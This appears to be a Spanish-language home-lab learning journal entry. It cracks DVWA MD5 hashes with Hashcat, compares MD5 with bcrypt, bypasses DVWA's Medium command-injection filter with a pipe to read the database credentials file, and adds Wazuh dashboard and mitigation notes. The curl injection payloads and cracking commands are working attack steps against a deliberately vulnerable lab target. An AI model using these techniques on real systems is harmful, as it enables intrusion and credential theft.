# Día 19 — Password Cracking: Hashcat + Command Injection Medium + Auto-refresh

**Fecha:** Abril 2026  
**MITRE:** T1110.002, T1059  
**DVWA:** Command Injection (Medium)

---

## Teoría

### Password Cracking — MD5 vs bcrypt
MD5 es un algoritmo de hash diseñado para ser rápido — lo que lo hace vulnerable a ataques de fuerza bruta. Con Hashcat y una GPU es posible probar millones de hashes por segundo. bcrypt fue diseñado específicamente para ser lento mediante key stretching — aplica el hash 4,096 veces (factor de costo 12) antes de producir el resultado final, reduciendo drásticamente la velocidad de cracking.

**Salt:** valor aleatorio agregado a la contraseña antes de hashear. Elimina rainbow tables y hace que dos usuarios con la misma contraseña tengan hashes diferentes.

### Command Injection Medium
En nivel Low era posible inyectar comandos usando `;` como separador. En nivel Medium DVWA filtra `;` y `&&` pero no el pipe `|` — cualquier separador no incluido en la lista negra funciona como bypass.

---

## Red Team

### Sección 1 — Hashcat: Cracking MD5

Hashes extraídos en el Día 13 via SQL Injection:

```bash
cat > /tmp/dvwa_hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
EOF
```

```bash
hashcat -m 0 /tmp/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Resultados — 4/4 crackeados en 1 segundo:**

| Hash | Contraseña |
|------|-----------|
| 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| e99a18c428cb38d5f260853678922e03 | abc123 |
| 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| 8d3533d75ae2c3966d7e0d4fcc69216b | charley |

**Estadísticas:**
- Velocidad: 31,665 hashes/segundo (solo CPU)
- Solo revisó el 0.02% de rockyou — encontró todo antes de llegar a contraseñas complejas

### Sección 2 — MD5 vs bcrypt

```bash
# MD5 — siempre el mismo resultado
echo -n "password" | md5sum
# → 5f4dcc3b5aa765d61d8327deb882cf99

# bcrypt — resultado diferente cada vez por salt aleatorio
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()).decode())"
# → $2b$12$LwJfdolj3McTfdK3797zb.RM4NMUl/i5g5DBOBSf2IHghN1g3LCJG
```

**Comparación:**

| | MD5 | bcrypt |
|--|--|--|
| Velocidad | 31,665/segundo | ~10/segundo |
| Salt | No | Sí (incluido en el hash) |
| Iteraciones | 1 | 4,096 (costo 12) |
| Rainbow tables | Vulnerable | Inmune |
| rockyou.txt completo | ~8 minutos | ~16 días |

El formato bcrypt `$2b$12$[salt][hash]` incluye todo en una sola cadena — el salt no se puede separar porque password y salt se mezclan matemáticamente antes de hashear.

### Sección 3 — DVWA Command Injection (Medium)

**Confirmación del filtro — `;` bloqueado:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/exec/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "ip=127.0.0.1; whoami&Submit=Submit"
# → Sin output — bloqueado
```

**Bypass con pipe `|`:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/exec/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "ip=127.0.0.1| whoami&Submit=Submit"
# → www-data
```

**Explotación — credenciales DB via config.inc.php:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/exec/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "ip=127.0.0.1| cat /var/www/html/config/config.inc.php&Submit=Submit" | grep -i "password\|user\|db"
```

**Output:**
```
$_DVWA[ 'db_user' ]     = 'app';
$_DVWA[ 'db_password' ] = 'vulnerables';
$_DVWA[ 'db_database' ] = 'dvwa';
```

**Comparación Low vs Medium:**

| Separador | Low | Medium |
|-----------|-----|--------|
| `;` | ✅ | ❌ Bloqueado |
| `&&` | ✅ | ❌ Bloqueado |
| `\|` | ✅ | ✅ Bypass |

**Cadena de ataque:**
```
Command Injection Medium via pipe |
    ↓
cat /var/www/html/config/config.inc.php
    ↓
Credenciales DB: app:vulnerables
    ↓
Acceso potencial a toda la base de datos
```

---

## App MS Security — Auto-refresh Wazuh

Se implementó auto-refresh de alertas Wazuh cada 30 segundos en el frontend:

```jsx
useEffect(() => {
  const fetchWazuhAlerts = () => {
    fetch("http://localhost:5000/wazuh/alerts")
      .then(res => res.json())
      .then(data => setWazuhAlerts(data.alerts || []))
  }
  
  fetchWazuhAlerts()
  const interval = setInterval(fetchWazuhAlerts, 30000)
  
  return () => clearInterval(interval)
}, [])
```

Indicador visual `↻ 30s` en el header de la tabla Wazuh.

**Dato relevante observado en el dashboard:**
- `SCA summary: Score less than 50% (32)` — el score CIS subió de 25% a 50% tras el hardening del Día 18
- `Windows Audit Policy changed` — Level 8 — Wazuh detectó los cambios de auditoría aplicados

---

## Wazuh

### Score CIS actualizado
El hardening del Día 18 elevó el score de **25% → 50%** — de 123 passed a ~240 passed aproximadamente. Los principales factores:
- 20 servicios deshabilitados
- Configuraciones de red (IP Source Routing, ICMP Redirects)
- LSASS protección
- Políticas de privacidad y telemetría

### Alerta detectada
`Windows Audit Policy changed` (Rule 60112, Level 8) — Wazuh registró automáticamente los cambios de auditoría aplicados con `auditpol`. Esto confirma que File Integrity Monitoring y auditoría de políticas está funcionando correctamente.

---

## Blue Team

### Detección Password Cracking
- Múltiples intentos de autenticación fallidos en secuencia — patrón de brute force
- Alertas de Account Lockout si está configurado
- En Wazuh — Rule 60204 detecta múltiples fallos de autenticación

### Mitigación Password Storage
- Nunca usar MD5 o SHA1 para contraseñas
- Usar bcrypt, argon2 o scrypt con factor de costo adecuado
- Agregar salt único por usuario — bcrypt lo hace automáticamente

### Mitigación Command Injection
- Validar inputs con whitelist — solo permitir IPs válidas (regex)
- Nunca pasar input del usuario directamente a funciones del sistema
- Usar funciones parametrizadas en lugar de concatenación de strings

---

## Conclusión

MD5 sin salt es completamente inseguro para contraseñas — 4 hashes crackeados en 1 segundo demuestra por qué las bases de datos modernas deben usar bcrypt o argon2. Command Injection Medium confirma que las listas negras son insuficientes — bloquear `;` y `&&` pero no `|` es un bypass trivial. El auto-refresh convierte el dashboard en una herramienta de monitoreo real — y los datos de Wazuh confirman que el hardening del Día 18 duplicó el score CIS de 25% a 50%.
